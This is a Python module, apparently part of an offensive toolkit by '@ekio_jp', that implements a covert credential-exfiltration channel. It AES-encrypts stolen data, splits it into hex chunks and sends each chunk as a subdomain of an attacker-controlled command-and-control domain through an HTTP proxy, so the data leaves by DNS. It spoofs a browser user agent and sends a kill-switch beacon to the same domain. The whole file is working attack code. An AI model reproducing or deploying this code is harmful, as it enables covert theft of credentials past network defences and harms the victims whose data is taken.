import threading
import pyaes
import pyscrypt
import requests
import logging
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("urllib3").propagate = False

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilPrx(threading.Thread):
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.magic = conf['MAGIC']
        self.ccname = conf['CCNAME']
        self.prx = conf['PRX']
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.max = 25
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):

        while not self.stoprequest.isSet():
            data = self.q.get()

            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
                            'Accept-Enconding': ', '.join(('gzip', 'deflate')),
                            'Accept': '*/*',
                            'Connection': 'keep-alive'
                    }

                    http_proxy = 'http://' + self.prx.decode()
                    proxyDict = {
                                'http': http_proxy,
                                'https': http_proxy
                                }

                    # encrypt data
                    cry = self.encrypt(data)

                    if len(cry) > self.max:
                        ar = [cry[i:i+self.max] for i in range(0, len(cry), self.max)]
                    else:
                        ar = [cry]

                    logging.debug('Sending credentials via Proxy DNS')

                    # Control pkt
                    fakeurl = 'http://' + str(len(cry)) + 'l.' + self.ccname
                    try:
                        r = requests.get(fakeurl, headers=headers, proxies=proxyDict)
                    except requests.exceptions.RequestException:
                        pass

                    # Chunks
                    for x in range(len(ar)):
                        fakeurl = 'http://' + ar[x] + '.' + self.ccname
                        try:
                            r = requests.get(fakeurl, headers=headers, proxies=proxyDict)
                        except requests.exceptions.RequestException:
                            pass

    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
                'Accept-Enconding': ', '.join(('gzip', 'deflate')),
                'Accept': '*/*',
                'Connection': 'keep-alive'
        }

        fakeurl = 'http://' + self.magic + '.' + self.ccname
        http_proxy = 'http://' + self.prx.decode()
        proxyDict = {
                    'http': http_proxy,
                    'https': http_proxy
                    }
        try:
            r = requests.get(fakeurl, headers=headers, proxies=proxyDict)
        except requests.exceptions.RequestException:
            pass

    # Stop Function
    def join(self):
        self.stoprequest.set()
